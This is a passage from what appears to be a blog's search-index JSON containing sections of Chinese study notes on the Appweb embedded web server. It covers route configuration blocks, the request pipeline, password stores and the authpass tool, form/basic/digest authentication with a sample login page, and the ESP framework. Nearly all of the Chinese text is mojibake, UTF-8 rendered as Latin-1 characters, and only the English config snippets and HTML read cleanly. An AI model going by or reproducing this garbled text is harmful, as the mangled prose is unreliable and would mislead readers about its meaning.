å½“æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œå®ƒä¼šæµ‹è¯•å„ç§è·¯ç”±å¹¶é€‰æ‹©æœ€å¥½çš„è·¯ç”±æ¥å¤„ç†è¯·æ±‚ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œè·¯ç”±å¯èƒ½ä¼šæ ¹æ®éœ€è¦é‡å®šå‘æˆ–é‡å†™è¯·æ±‚ã€‚ ä¸€ä¸ªå¸¸è§„çš„è·¯ç”±å—å¦‚ä¸‹æ‰€ç¤ºï¼š \u003cRoute /info\u003e # match request URIs that begin with \"/info/\" Documents \"${DOCUMENT_ROOT}/info\" AuthType basic example.com # Use basic authentication Require secure # Must be accessed over SSL Require ability edit # Authenticated users must have the edit ability LimitRequestBody 100k # Only requests less than 100K are accepted RequestTimeout 10secs # Request must complete in \u003c 10 seconds RequestParseTimeout 2secs # Denial-of-service protection \u003c/Route\u003e è·¯ç”±å—ä¸­çš„éƒ¨åˆ†å¸¸ç”¨æŒ‡ä»¤å¦‚ä¸‹ï¼š SetHandler â€”å¤„ç†è¯·æ±‚çš„è¯·æ±‚handler (CGI, ESP, EJS, PHP, â€¦) Documents â€” æœåŠ¡å†…å®¹æ‰€åœ¨ç›®å½• AuthType â€” è®¤è¯åè®®ï¼šbasic, digest or web form Cache â€” å¦‚ä½•ç¼“å­˜å“åº” Redirect â€” å“åº”é‡å®šå‘ AddLanguageDir â€” å¤šè¯­è¨€å†…å®¹ Compress â€”å¤„ç†å‹ç¼©çš„å“åº” Methods â€” å…è®¸çš„è¯·æ±‚æ–¹æ³• Require â€” è¦æ±‚çš„ç”¨æˆ·å‡­æ®ã€è§„åˆ™æˆ–å±æ€§ç­‰ Limit* â€” å®‰å…¨æ²™ç®±é™åˆ¶ SSLCertificateFile â€” SSL é…ç½® æ›´å¤šå†…å®¹å¯ä»¥é˜…è¯» Appweb Request Routing å’Œ Appweb Configuration Directives. ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:1","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"2. Pipeline Engine Appweb å…·å¤‡ä¸€ä¸ªé«˜æ•ˆçš„ã€é›¶æ‹·è´çš„è¯·æ±‚pipelineæ¥å¤„ç†è¯·æ±‚ï¼Œå¹¶ç”Ÿæˆå¯¹åº”çš„å“åº”ï¼Œè¿™åŒ…æ‹¬é˜Ÿåˆ—ç®—æ³•ã€æ•°æ®åŒ…ã€ç¼“å†²åŒºå’Œæ—¶é—´è°ƒåº¦ã€‚pipeline çš„ç»“æ„é«˜åº¦å®šåˆ¶åŒ–ï¼Œä½¿ç”¨sendfileã€å¼‚æ­¥ I/O å’Œå‘é‡åŒ–ã€ç¦»æ•£/èšåˆçš„æ–¹å¼å†™å…¥ç½‘ç»œï¼Œä»¥é¿å…åœ¨å†™å…¥ç½‘ç»œä¹‹å‰åœ¨å•ä¸ªç¼“å†²åŒºä¸­æ˜‚è´µçš„æ•°æ®å’Œæ ‡å¤´èšåˆæ¶ˆè€—ã€‚ Nginx ä¼ä¸š Web æœåŠ¡å™¨å°†æ€§èƒ½æå‡åˆ°ä¸€ä¸ªæ–°çš„æ°´å¹³å¹¶åœ¨è®¸å¤šç«™ç‚¹ä¸­å–ä»£äº† Apacheã€‚ä½†æ˜¯åµŒå…¥å¼ Web æœåŠ¡å™¨ä¸€èˆ¬è¦æ¯”å¸¸è§„çš„ web server çš„å®ˆæŠ¤è¿›ç¨‹å¤„ç†é€Ÿåº¦ä¸Šæ…¢å¾—å¤šã€‚è™½ç„¶æ‹¥æœ‰åƒå…†å­—èŠ‚çš„å†…å­˜ä¼šæœ‰åŠ©äºæé«˜ Web æœåŠ¡å™¨çš„é€Ÿåº¦ï¼Œä½†ä½¿ç”¨æ­£ç¡®çš„æ¶æ„å’Œå†…éƒ¨è®¾è®¡æ›´ä¸ºé‡è¦ã€‚ Appweb ä½¿ç”¨äº†åµŒå…¥å¼ Web æœåŠ¡å™¨çš„æœ€ä½³å®è·µï¼Œä½¿å¾—åœ¨åµŒå…¥å¼ç¯å¢ƒä¸­ä¹Ÿèƒ½å–å¾—ä¸ Nginx ç›¸åŒçš„å¤„ç†é€Ÿåº¦ã€‚ ä¸ Nginx ä¸€æ ·ï¼ŒAppweb ä½¿ç”¨éé˜»å¡ã€åŸºäºäº‹ä»¶çš„è®¾è®¡æ¥å¼‚æ­¥å¤„ç†è¯·æ±‚ï¼Œå®¢æˆ·ç«¯çš„æ¯ä¸ªè¯·æ±‚æ— éœ€ä½¿ç”¨ä¸“æœ‰è¿›ç¨‹æˆ–çº¿ç¨‹ã€‚å½“è¯·æ±‚å¾…å¤„ç†æ—¶ï¼ŒAppweb ä½¿ç”¨äº‹ä»¶æ¥ä¸ºè¯·æ±‚æä¾›æœåŠ¡ã€‚æ‰€ä»¥æ¯ä¸ª worker çº¿ç¨‹å¯èƒ½ä¼šè¢«è®¸å¤šè¯·æ±‚å…±äº«ï¼Œè¿™ç§æœºåˆ¶ç¡®ä¿äº†å¿«é€Ÿå“åº”ï¼ŒåŒæ—¶æ¶ˆè€—è¾ƒå°‘çš„èµ„æºã€‚ Appweb å°†åŸºäºäº‹ä»¶çš„å†…æ ¸ä¸é«˜æ•ˆçš„ pipeline ç›¸ç»“åˆã€‚pipeline åŒ…å«ä¸€ä¸ªå¯¹è¾“å…¥å’Œè¾“å‡ºçš„æ•°æ®è¿›è¡Œå¤„ç†çš„é˜¶æ®µï¼Œè¯¥é˜¶æ®µä¸»è¦åŒ…å«äº†å„ç§å„æ ·çš„è¿‡æ»¤å™¨ï¼Œè¿™äº›è¿‡æ»¤å™¨ä¼šå¯¹æ•°æ®è¿›è¡Œåˆ†å—ã€æ’åˆ—ã€ä¸Šä¼ å’Œç¼“å­˜ã€‚ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œpipelineä¼šä»¥æ•°æ®åŒ…çš„å½¢å¼è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œè€Œä¸è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œæ•°æ®åŒ…æœ‰æ•ˆåœ°æºå¸¦æ•°æ®åŒ…å¤´æˆ–å°¾ï¼Œä»¥ä¾¿æ•°æ®å¯ä»¥åœ¨ä¸å¤åˆ¶çš„æƒ…å†µä¸‹è¿›è¡Œå°åŒ…ï¼Œè¿™å¯¹äºé«˜æ•ˆçš„ HTTP åˆ†å—è‡³å…³é‡è¦ã€‚ pipeline ä¸ç½‘ç»œé€šä¿¡å¹¶ä½¿ç”¨å¹³å°ä¸Šå¯ç”¨çš„æœ€æœ‰æ•ˆçš„ I/O åŸè¯­ã€‚ Appweb æ”¯æŒå‘é‡å¥—æ¥å­—å†™å…¥ã€sendfile å’Œå¿«é€Ÿ O/S äº‹ä»¶æœºåˆ¶ï¼Œå¦‚ kqueue å’Œ epollï¼Œ è¿™ç§æ¶æ„æå¤§åœ°æå‡äº†å¤„ç†é€Ÿåº¦å¹¶Web æœåŠ¡å™¨çš„â€œä½“å‹â€å¨‡å°ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:2","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"3. Authentication Framework Appweb é›†æˆäº†ä¸€ä¸ªå®Œæ•´çš„è®¤è¯æ¡†æ¶ï¼Œå…¶ä¸­åŒ…å«ï¼š ç”¨æˆ·ç™»å½•ç™»å‡ºæœºåˆ¶ å®‰å…¨å¯†ç ä¼ è¾“ çµæ´»å¯†ç å­˜å‚¨ ç”¨æˆ·å‡­æ®éªŒè¯ æ§åˆ¶ç‰¹å®šç”¨æˆ·æˆ–ç”¨æˆ·ç»„å¯¹èµ„æºçš„è®¿é—® Appweb æä¾›äº†3ç§è®¤è¯åè®®ï¼šbasicï¼Œ digest ä»¥åŠ web-formã€‚å¦‚æœç”¨æˆ·ä½¿ç”¨ web-form è¾“å…¥ç™»å½•å‡­æ®ï¼ŒAppweb ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºSSLä¼ è¾“ä»¥ç¡®ä¿ä¼ è¾“å®‰å…¨ã€‚å¯†ç å°†è¢«åŠ å¯†ä¿å­˜åœ¨ä¸€ä¸ªå¹³é¢æ–‡ä»¶(flat file)ä¸­æˆ–è€…ä½¿ç”¨æœ¬æœºæ“ä½œç³»ç»Ÿçš„å¯†ç æœºåˆ¶ã€‚ ç”¨æˆ·é€šè¿‡èº«ä»½è®¤è¯åï¼Œå°†è·å¾—ä¸€ç»„â€œå±æ€§â€çš„æˆæƒï¼Œè¿™äº›æ˜¯é€šè¿‡ Appweb åŸºäºè§’è‰²çš„æˆæƒæ–¹æ¡ˆä¸ºæ¯ä¸ªç”¨æˆ·é…ç½®çš„ã€‚æ¯ä¸ªè·¯ç”±ï¼ˆä¸€ç»„ URIï¼‰éƒ½å¯ä»¥é…ç½®ä¸ºåœ¨æˆäºˆç”¨æˆ·è®¿é—®æƒé™ä¹‹å‰éœ€è¦æŸäº›â€œå±æ€§â€ã€‚ Appweb çš„è®¤è¯æ¶æ„ä¸»è¦åŒ…å«ä»¥ä¸‹2ä¸ªç»„ä»¶ï¼š è®¤è¯ç”¨æˆ·å/å¯†ç å­˜å‚¨ è®¤è¯åè®® 1. è®¤è¯ç”¨æˆ·å/å¯†ç å­˜å‚¨ Appweb æœ‰3ç§å­˜å‚¨å¯†ç çš„æ–¹æ³•ï¼š app - Application (custom) Password Database config - Configuration Directives in the app web.conf system - System Password Database appå­˜å‚¨æ˜¯ç”¨æˆ·åº”ç”¨ç¨‹åºå°†å¯†ç å­˜å‚¨åœ¨æ•°æ®åº“æˆ–å…¶ä»–è‡ªå®šä¹‰çš„å­˜å‚¨å¯†ç çš„åœ°æ–¹ï¼Œç”¨æˆ·åº”ç”¨ç¨‹åºè´Ÿè´£å®ç°å‡­æ®éªŒè¯å›è°ƒã€‚Appweb å°†è°ƒç”¨è¯¥å›è°ƒæ¥è®¿é—®è‡ªå®šä¹‰å¯†ç å­˜å‚¨å¹¶å°†æä¾›çš„å‡­æ®ä¸ç”¨æˆ·å¯†ç è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæœ‰éœ€è¦åœ¨è¿è¡Œæ—¶ä¿®æ”¹ç”¨æˆ·å’Œå¯†ç çš„éœ€æ±‚ï¼Œè¯¥ç§å­˜å‚¨æ–¹æ³•ä¸ºé¦–é€‰é¡¹ã€‚ä½¿ç”¨è¯¥æ–¹æ³•éœ€è¦ä½¿ç”¨httpSetAuthVerifyByName API æ¥æ³¨å†Œå›è°ƒå‡½æ•°ï¼Œæ­¤æ—¶æ³¨å†Œçš„å›è°ƒå¯ä»¥åº”ç”¨äºæ‰€æœ‰çš„è·¯ç”±ï¼›å¦‚æœä½¿ç”¨httpSetAuthVerify API æ³¨å†Œå›è°ƒï¼Œåˆ™åªèƒ½åº”ç”¨äºå…·ä½“çš„æŸä¸€ä¸ªè·¯ç”±ã€‚ config å­˜å‚¨é€šè¿‡ Appweb é…ç½®æ–‡ä»¶ä¸­çš„UseræŒ‡ä»¤æ¥ç®¡ç†å¯†ç ï¼Œauthpassç¨‹åºåˆ›å»ºå¯†ç ï¼Œå¹¶åœ¨appweb.confä¸­è¿›è¡Œå®šä¹‰ã€‚åœ¨ä¸éœ€è¦åŠ¨æ€æ·»åŠ ã€åˆ é™¤æˆ–ç¼–è¾‘ç”¨æˆ·åæˆ–å¯†ç æ—¶å¯ä»¥ä½¿ç”¨è¯¥ç§æ–¹æ³•ã€‚ systemå­˜å‚¨åˆ™æ˜¯ä½¿ç”¨ç³»ç»Ÿå¯†ç æ•°æ®åº“(e.g. /etc/password) å…·ä½“ä½¿ç”¨ä½•ç§å­˜å‚¨æ–¹å¼ç”±AuthStoreæŒ‡ä»¤æŒ‡å®šã€‚ä¾‹å¦‚ï¼š AuthStore system åˆ›å»ºå¯†ç  åˆ›å»ºå¯†ç ä½¿ç”¨authpassç¨‹åºï¼Œå¦‚æœä½¿ç”¨åº”ç”¨ç¨‹åºå®šä¹‰æ•°æ®åº“å­˜å‚¨ï¼Œåˆ™AuthStoreåº”è¯¥è®¾ç½®æˆappï¼Œauthpassç¨‹åºåˆ›å»ºçš„å¯†ç ä¼šå­˜å‚¨åœ¨åº”ç”¨ç¨‹åºæ•°æ®åº“ä¸­ã€‚ authpassçš„å‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š authpass [--cipher blowfish|md5] [--file auth.conf] [--password word] realm username roles... --file filename é€‰é¡¹æŒ‡å®šè®¤è¯æ–‡ä»¶åç§°ï¼Œå¦‚æœæœªæŒ‡å®šï¼Œå¯†ç å°†æ‰“å°åœ¨æ ‡å‡†è¾“å‡ºä¸Šã€‚ authpass ç¨‹åºè¿˜å¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„å¯†ç å®šä¹‰ã€‚ --cipher é€‰é¡¹æŒ‡å®šç”¨äºæ•£åˆ—/åŠ å¯†å¯†ç çš„å¯†ç ã€‚ é»˜è®¤ä¸º MD5ï¼Œï¼Œä½†blowfishæ›´å®‰å…¨ã€‚ Blowfish æ›´é€‚ç”¨äº Basic å’Œ Form èº«ä»½éªŒè¯æ–¹æ¡ˆã€‚ å¦‚æœæœªä½¿ç”¨ --password é€‰é¡¹ï¼Œauthpass å°†æç¤ºè¾“å…¥å¯†ç ã€‚ realmå®šä¹‰äº†ä¸€ç»„å¯†ç ï¼Œå¹¶é€šè¿‡ AuthType æŒ‡ä»¤è®¾ç½®ï¼Œé€šå¸¸è®¾ç½®ä¸ºå…¬å¸åŸŸæˆ–äº§å“åç§°ã€‚ æ³¨ï¼šèº«ä»½éªŒè¯æ–‡ä»¶å¿…é¡»å­˜å‚¨åœ¨ Documents ç›®å½•æˆ–ä»»ä½•æä¾›å†…å®¹çš„ç›®å½•ä¹‹å¤–ã€‚ 2. è®¤è¯åè®® è®¤è¯åè®®å®šä¹‰äº†å¦‚ä½•ä»ç”¨æˆ·å¤„æ•è·ç”¨æˆ·å‡­æ®å¹¶æä¾›ç»™Appwebï¼ŒAppweb æä¾›äº†ä¸åŒçš„è®¤è¯åè®®ï¼š Application Authentication åº”ç”¨ç¨‹åºèº«ä»½éªŒè¯ä½¿ç”¨ç‰¹å®šäºåº”ç”¨ç¨‹åºçš„æ–¹å¼æ¥æ•è·ç”¨æˆ·åå’Œå¯†ç ã€‚ç”¨æˆ·åº”ç”¨ç¨‹åºè´Ÿè´£å®ç°æ§åˆ¶é€»è¾‘ä»¥æ•è·ç”¨æˆ·å‡­æ®å¹¶é€šè¿‡ç™»å½•å’Œæ³¨é”€è¿‡ç¨‹é‡å®šå‘å®¢æˆ·ç«¯ã€‚æ­¤åè®®æœ€é€‚ç”¨äºä½¿ç”¨æœåŠ¡å™¨ç«¯ Web æ¡†æ¶ï¼ˆå¦‚ ESPï¼‰çš„åº”ç”¨ç¨‹åºã€‚ Web Form Authentication è¡¨å•èº«ä»½éªŒè¯æ–¹æ¡ˆä½¿ç”¨ HTML Web è¡¨å•è®©ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å‡­æ®ï¼Œå¹¶ä½¿ç”¨ HTTP Post è¯·æ±‚å°†å‡­æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡ŒéªŒè¯ã€‚ ä½¿ç”¨æ­¤åè®®ï¼Œå¯ä»¥é€šè¿‡AuthType æŒ‡ä»¤å®šä¹‰ç‰¹å®šçš„ç™»å½•å’Œæ³¨é”€é¡µé¢ã€‚ Appweb ç®¡ç†ç™»å½•/æ³¨é”€è¿‡ç¨‹ï¼Œå¦‚æœèº«ä»½éªŒè¯æˆåŠŸï¼Œåˆ™ä¼šåˆ›å»ºç™»å½•ä¼šè¯å¹¶å°† cookie è¿”å›åˆ°å®¢æˆ·ç«¯çš„æµè§ˆå™¨ï¼ŒåŒ…å« cookie çš„åç»­è¯·æ±‚å°†è¢«è‡ªåŠ¨éªŒè¯å¹¶æä¾›æœåŠ¡ã€‚ è¦é…ç½®è¡¨å•èº«ä»½éªŒè¯ï¼ŒAuthType æŒ‡ä»¤éœ€è¦é¢å¤–çš„å‚æ•°æ¥ç®¡ç†ç™»å½•åºåˆ—ï¼ŒåŒ…æ‹¬æŒ‡å®šç™»å½•ç½‘é¡µã€ç™»å½•æœåŠ¡ URLã€æ³¨é”€æœåŠ¡ URLã€éªŒè¯åæ˜¾ç¤ºçš„ç›®æ ‡é¡µé¢å’Œæ³¨é”€åæ˜¾ç¤ºçš„ç›®æ ‡é¡µé¢ã€‚ æ ¼å¼ä¸ºï¼š AuthType form realm Login-Page Login-Service Logout-Service Logged-In-Destination Logged-Out-Destination è¯¥æŒ‡ä»¤å®šä¹‰åœ¨ç™»å½•åºåˆ—æœŸé—´ä½¿ç”¨çš„ URLã€‚è¯¥æŒ‡ä»¤æ ¹æ®è¿™äº› URL çš„è¦æ±‚åˆ›å»ºè¯·æ±‚è·¯ç”±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢å’Œç™»å½•æœåŠ¡ã€‚è¿™äº› AuthType å‚æ•°ä¸­çš„æ¯ä¸€ä¸ªéƒ½æ˜¯å¯é€‰çš„ï¼Œå¯ä»¥æŒ‡å®šä¸ºç©ºå­—ç¬¦ä¸²\"\"ä»¥çœç•¥ã€‚ ä¾‹å¦‚ï¼š \u003cRoute ^/\u003e AuthType form example.com /public/login.html /login /logout //public/login.html \u003c/Route\u003e \u003cRoute ^/public/\u003e Profix /public Document public AuthType none \u003c/Route\u003e æ­¤ç¤ºä¾‹ä¸ºæ‰€æœ‰è¯·æ±‚å¯ç”¨è¡¨å•èº«ä»½éªŒè¯ï¼Œå¹¶å°†å®¢æˆ·ç«¯æµè§ˆå™¨é‡å®šå‘åˆ°/public/login.htmlï¼Œç”¨æˆ·å¯ä»¥è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚ç™»å½•ç½‘é¡µåº”å°†ç”¨æˆ·åå’Œå¯†ç æäº¤ç»™ç»‘å®šåˆ°/login URLçš„ç™»å½•æœåŠ¡ã€‚å½“éœ€è¦æ³¨é”€æ—¶ï¼Œå®¢æˆ·ç«¯åº”å‘ç»‘å®šåˆ°/logout URLçš„æ³¨é”€æœåŠ¡æäº¤ HTTP POST è¯·æ±‚ã€‚AuthType æŒ‡ä»¤ä¸­çš„æœ€åä¸¤ä¸ªå­—æ®µæ˜¯å®¢æˆ·ç«¯æµè§ˆå™¨åœ¨ç™»å½•å’Œæ³¨é”€åå°†é‡å®šå‘åˆ°çš„ç›®æ ‡ URLã€‚ç¬¬äºŒä¸ª /public è·¯ç”±æ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®â€œpublicâ€ç›®å½•ä¸‹çš„æ–‡æ¡£ã€‚ Login-Service æ˜¯ç»‘å®šåˆ°å†…éƒ¨æœåŠ¡çš„ URLï¼Œç”¨äºæ¥æ”¶ç”¨æˆ·åå’Œå¯†ç å¹¶å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚æ­¤æœåŠ¡æœŸæœ›ä½¿ç”¨è¾“å…¥å­—æ®µâ€œç”¨æˆ·åâ€å’Œâ€œå¯†ç â€é€šè¿‡ POST æ•°æ®æäº¤ç”¨æˆ·å/å¯†ç ã€‚å¯ä»¥é€šè¿‡åœ¨ AuthType æŒ‡ä»¤ä¸­ä¸º Login-ServiceæŒ‡å®šç©ºå­—ç¬¦ä¸²\"\"æ¥æä¾›è‡ªå®šä¹‰çš„ç™»å½•å’Œæ³¨é”€æœåŠ¡ã€‚å¦‚æœä½¿ç”¨è‡ªå®šä¹‰çš„ç™»å½•æœåŠ¡ï¼Œåˆ™åº”è¯¥è°ƒç”¨httpLoginä»¥æ ¹æ®é…ç½®çš„å¯†ç å­˜å‚¨éªŒè¯ç”¨æˆ·ã€‚ Web Form è¿™æ˜¯ä¸€ä¸ªæœ€å°ç¤ºä¾‹ç™»å½•é¡µé¢ï¼š \u003chtml\u003e\u003chead\u003e\u003ctitle\u003elogin.html\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003cp\u003ePlease log in\u003c/p\u003e \u003cform name=\"details\" method=\"post\" action=\"/auth/login\" \u003e username \u003cinput type=\"text\" name=\"username\" value=''\u003e\u003cbr/\u003e password \u003cinput type=\"password\" name=\"password\" value=''\u003e\u003cbr/\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"OK\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e æäº¤çš„ä¸¤ä¸ªå­—æ®µå¿…é¡»å‘½åä¸ºusernameå’Œpasswordä»¥ä¾›â€œè¡¨å•â€èº«ä»½éªŒè¯æ–¹æ¡ˆä½¿ç”¨ã€‚ å¦‚æœç™»å½•å°è¯•æˆåŠŸï¼Œå®¢æˆ·ç«¯å°†æ”¶åˆ°åŒ…å«ä¼šè¯ cookie çš„å“åº”ï¼Œå¹¶å°†è¢«é‡å®šå‘åˆ°ç›®æ ‡ URLã€‚å¦‚æœç›®æ ‡ URL åŒ…å«ä¸€ä¸ªreferrer:å‰ç¼€å¹¶ä¸”ç™»å½•è¯·æ±‚åœ¨ HTTP æ ‡å¤´ä¸­åŒ…å«ä¸€ä¸ªå¼•ç”¨ URLï¼Œé‚£ä¹ˆè¯¥å¼•ç”¨ URL å°†ç”¨ä½œç›®æ ‡è€Œä¸æ˜¯ç¡¬è¿æ¥ç›®æ ‡ã€‚ æ³¨ï¼šâ€œè¡¨å•â€èº«ä»½éªŒè¯æœºåˆ¶ä»¥çº¯æ–‡æœ¬å½¢å¼æäº¤ç”¨æˆ·å¯†ç ã€‚ä¸ºç¡®ä¿é€šä¿¡å®‰å…¨ï¼Œåº”åœ¨ä½¿ç”¨ TLS/SSL çš„å®‰å…¨è¿æ¥ä¸Šä½¿ç”¨â€œè¡¨å•â€èº«ä»½éªŒè¯æ–¹æ¡ˆã€‚ Basic Authentication Digest Authentication Basic å’Œ Digest èº«ä»½éªŒè¯æ˜¯ HTTP/1.1 RFC2616 è§„èŒƒå®šä¹‰çš„ HTTP åè®®æœºåˆ¶ã€‚å› ä¸ºå®ƒä»¬åœ¨ HTTP åè®®çº§åˆ«è¿è¡Œï¼Œæ‰€ä»¥åŠŸèƒ½ç®€å•ï¼Œä¸”çµæ´»æ€§å·®ã€‚å½“å®¢æˆ·ç«¯å°è¯•è®¿é—®å—ä¿æŠ¤çš„å†…å®¹æ—¶ï¼Œå®¢æˆ·ç«¯çš„æµè§ˆå™¨ä¼šæ˜¾ç¤ºä¸€ä¸ªé€šç”¨å¼¹å‡ºå¯¹è¯æ¡†ä»¥æç¤ºç”¨æˆ·è¾“å…¥å‡­æ®ã€‚ åº”è¯¥åªå°†åŸºæœ¬å’Œæ‘˜è¦å¼èº«ä»½éªŒè¯ç”¨ä½œæœ€åçš„æ‰‹æ®µã€‚ Basic å’Œ Digest èº«ä»½éªŒè¯æ ‡å‡†ä½¿ç”¨å¼±å¯†ç ï¼Œé€šè¿‡ç½‘ç»œé‡å¤å‘é€å‡­æ®ï¼Œå¹¶ä¸”ä¸å¤Ÿå®‰å…¨ã€‚åŸºæœ¬èº«ä»½éªŒè¯åœ¨æ¯ä¸ªè¯·æ±‚ä¸­ä»¥æ˜æ–‡å½¢å¼ä¼ è¾“å¯†ç ã€‚æ‘˜è¦å¼èº«ä»½éªŒè¯ä½¿ç”¨å¼± MD5 å¯†ç ï¼Œå¹¶ä¸”ä¸¤è€…éƒ½è¦æ±‚å¯¹æ‰€æœ‰è¯·æ±‚ä½¿ç”¨ SSL ä»¥ç¡®ä¿æœ€ä½é™åº¦çš„å®‰å…¨ã€‚æ­¤å¤–ï¼ŒBasic å’Œ Digest éƒ½ä¸æä¾›å¯é çš„æ³¨é”€æœºåˆ¶ã€‚æ³¨é”€é€‚ç”¨äºæŸäº›æµè§ˆå™¨ï¼Œä½†ä¸é€‚ç”¨äºå…¶ä»–æµè§ˆå™¨ç”šè‡³åŒä¸€æµè§ˆå™¨çš„ä¸åŒç‰ˆæœ¬ã€‚ Appweb èº«ä»½éªŒè¯æ¡†æ¶ååˆ†å…¨é¢ï¼Œä½¿å¼€å‘äººå‘˜ä¸å¿…å°†å„ä¸ªéƒ¨åˆ†è¿›è¡Œæ‹¼å‡‘ç»„åˆæˆä¸€ä¸ªè®¤è¯æ–¹æ¡ˆã€‚æ›´ä¸ºè¯¦ç»†çš„å†…å®¹å¯ä»¥å‚è€ƒAuthenticationã€‚ 3. webæ¡†æ¶ å¦‚æœä½¿ç”¨ ESPã€PHP æˆ–å…¶ä»– Web æ¡†æ¶ï¼Œåˆ™ä¸åº”å°†æ‰©å±•çš„AuthType formæŒ‡ä»¤ä¸ URL ä¸€èµ·ä½¿ç”¨ã€‚è¿™æ˜¯å› ä¸ºè¿™äº› web æ¡†æ¶é›†æˆäº†ç™»å½•å·¥å…·ï¼Œåœ¨ web æ¡†æ¶ä¸­ä½¿ç”¨èµ·æ¥æ›´è‡ªç„¶ã€‚æ‰©å±•çš„ AuthType formæŒ‡ä»¤é€‚åˆä½¿ç”¨é™æ€ç½‘é¡µçš„ç½‘ç«™ï¼Œå› ä¸ºå®ƒå¯ä»¥åœ¨ç™»å½•æœŸé—´æ— ç¼ç®¡ç†æµè§ˆå™¨é¡µé¢è½¬æ¢ã€‚ä½¿ç”¨ ESP Web æ¡†æ¶æ—¶ï¼Œè¯·é€‰æ‹©ä½¿ç”¨AuthType appèº«ä»½éªŒè¯åè®®ã€‚ 4. SSLåŠ å¯† åœ¨è€ƒè™‘å¯¹å‘é€æˆ–æ¥æ”¶æ¥è‡ªåº”ç”¨ç¨‹åºçš„æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œæœ‰ä¸¤ç§åŸºæœ¬çš„å®‰å…¨ç­–ç•¥ï¼š ä¿è¯æ•´ä¸ªåº”ç”¨","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:3","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"4. Embedded Server Pages ESP web Framework å¯ä»¥è¯´æ˜¯ Appweb ä¸­æœ€ä¼˜ç§€çš„éƒ¨åˆ†ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…¸å‹çš„MVCæ¡†æ¶ï¼Œå¯ä»¥å®¹æ˜“åœ°åˆ›å»ºå¿«é€Ÿã€åŠ¨æ€çš„webåº”ç”¨ã€‚ESPæ˜¯ä¸€ä¸ªåŸºäºCçš„webæ¡†æ¶ï¼Œä½†ä¸åƒä¸€èˆ¬çš„Cç¼–ç ï¼ŒESPæ¡†æ¶çš„webé¡µé¢æ”¯æŒåµŒå…¥å¼Cç¼–ç ã€‚ç”šè‡³ï¼Œå®ƒæ”¯æŒç½‘é¡µä¿®æ”¹æ—¶åŠ¨æ€é€æ˜çš„é‡æ–°ç¼–è¯‘å’Œé‡æ–°åŠ è½½ã€‚å®ƒè¿˜æ£€æµ‹å¹¶è‡ªåŠ¨é‡æ–°ç¼–è¯‘ä¿®æ”¹åçš„ ESP æ§åˆ¶å™¨ï¼ˆç”¨ C ç¼–å†™ï¼‰ã€‚è¿™ä½¿å¾— ESP çš„è¡Œä¸ºå°±åƒä¸€ä¸ªè„šæœ¬åŒ–çš„ Web æ¡†æ¶ã€‚ ä¸ºäº†è§£å†³Cè¯­è¨€å¸¸è§çš„å†…å­˜åˆ†é…å’Œå†…å­˜æ³„æ¼é—®é¢˜ï¼ŒESP ä½¿ç”¨äº†åƒåœ¾å›æ”¶å™¨åœ¨è¯·æ±‚å¤„ç†å®Œæˆåæ¥è‡ªåŠ¨é‡Šæ”¾å†…å­˜ã€‚ ESP æ¡†æ¶æä¾›äº†ä¸€ä¸ªåº”ç”¨ç”Ÿæˆå™¨ã€web é¡µé¢æ¨¡æ¿å¼•æ“ã€MVC æ¡†æ¶ã€ HTML æ§åˆ¶åº“å’Œ API æ‰©å±•æ¥åˆ›å»º web åº”ç”¨ç¨‹åºã€‚ ESP åº”ç”¨ç¨‹åºé€šå¸¸å®šä¹‰åœ¨ä¸€ç»„ç›®å½•ä¸­ï¼š cache â€” ç¼“å­˜é¢„ç¼–è¯‘çš„ ESP æ§åˆ¶å™¨å’Œé¡µé¢ client â€” å®¢æˆ·ç«¯ web é¡µå†…å®¹ã€å›¾ç‰‡ã€æ ·å¼ç­‰ controllers â€” ESP æ§åˆ¶å™¨æ–¹æ³• layouts â€” ä¸»é¡µé¢å¸ƒå±€ db â€” æ•°æ®åº“å’Œæ•°æ®åº“è¿ç§» å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„ ESP åº”ç”¨ç¨‹åºï¼š mkdir blog cd blog esp install esp-html-mvc å…³äº ESP æ¡†æ¶çš„å†…å®¹ååˆ†ä¸°å¯Œï¼Œå¯ä»¥å•ç‹¬æ‹¿å‡ºæ¥è¯¦ç»†è¯´æ˜ï¼Œç»™å‡ºå®˜ç½‘æ–‡æ¡£ ESP Docsã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:4:4","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"äº”ã€å®‰å…¨æ€§ web server 